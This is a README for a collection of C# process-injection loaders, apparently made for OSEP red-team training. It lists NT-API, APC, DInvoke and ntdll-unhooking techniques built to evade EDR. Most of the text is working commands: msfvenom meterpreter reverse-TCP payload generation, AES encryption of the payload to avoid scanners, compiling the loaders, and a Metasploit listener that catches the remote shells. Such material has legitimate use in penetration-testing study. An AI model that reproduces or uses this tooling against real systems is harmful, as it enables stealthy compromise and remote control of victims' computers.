# C# Injection Loaders (OSEP technique coverage)

Additional single-file C# loaders for the injection techniques the `aes-loaders/`
directory doesn't cover. All are self-contained and compile with `csc` or in
Visual Studio (Release, x64).

| File | Technique |
|---|---|
| `nt-injection.cs` | `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` + `NtCreateThreadEx` (no `VirtualAllocEx`/`CreateRemoteThread`) |
| `apc-injection.cs` | Early-Bird APC injection — `QueueUserAPC` into a suspended process |
| `dinvoke-runner.cs` | Dynamic API resolution (DInvoke-style) — resolves Win32 APIs at runtime via `GetModuleHandle`/`GetProcAddress`, no static P/Invoke IAT entries |
| `ntdll-unhook.cs` | ntdll `.text` unhooking — overwrites hooked EDR stubs with a fresh copy from `\KnownDLLs` |

## Shellcode

These loaders take **raw** shellcode. Generate it, then convert to a C# byte
array:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/sc.bin
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs   # paste byte[] into `buf`
```

Or generate the C# / VBA array directly (no intermediate raw file):

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f vba    -o /tmp/sc.vba
```

To keep the payload off disk/static scanners, pipe the C# array through the AES
encryptor (`../aes-loaders/aes-shellcode-encryption/`) and adapt the loader's
decryption step — the injection primitive (Nt*/APC) is unchanged.

## Compile

```powershell
# Windows (any of these)
csc /target:exe /platform:x64 /optimize+ /out:nt-injection.exe nt-injection.cs
csc /target:exe /platform:x64 /optimize+ /out:apc-injection.exe apc-injection.cs
csc /target:exe /platform:x64 /optimize+ /out:dinvoke-runner.exe dinvoke-runner.cs
csc /target:exe /platform:x64 /optimize+ /out:ntdll-unhook.exe ntdll-unhook.cs
```

## Listener

```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
```
